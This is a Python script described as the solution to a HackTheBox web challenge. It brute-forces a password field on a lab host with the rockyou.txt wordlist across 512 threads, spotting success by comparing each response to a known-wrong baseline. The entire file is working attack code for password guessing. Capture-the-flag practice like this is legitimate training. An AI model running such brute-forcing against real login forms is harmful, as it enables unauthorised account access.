'''
This script provided me the solution to a web app pen testing challenge
located on https://hackthebox.eu/

The challenge involved brute forcing a ?password parameter at the given url

An alternative solution would have been to use the THC-Hydra tool
'''
import queue
import requests
import threading
import codecs
import time
import sys

#this post request acts as a baseline, as we know 'asdasd' is not the password
x = requests.post('http://docker.hackthebox.eu:37483/', data={'password': 'asdasd'}).text

q = queue.Queue()
def threader():
	while (True):
		thread = q.get()
		scan(thread)
		q.task_done()

def scan(password):
	try:
		data = {'password': password}
		r = requests.post('http://docker.hackthebox.eu:37483/', data=data)
		if r.text != x:
			print(r.text)
			print('\n')
			print(password)
			sys.exit(0)
	except:
		pass

arr = []
with codecs.open('rockyou.txt', 'r', encoding='utf-8', errors='ignore') as f:
	for line in f:
		arr.append(line.strip())

total = len(arr)
print('Lines read from rockyou.txt: {}'.format(total))

for _ in range(512):
    t = threading.Thread(target= threader)
    t.daemon = True
    t.start()

for password in arr:
	q.put(password)

while q.qsize() != 0:
	print('Requests sent: {}'.format(total - q.qsize()))
	time.sleep(10)
	
q.join()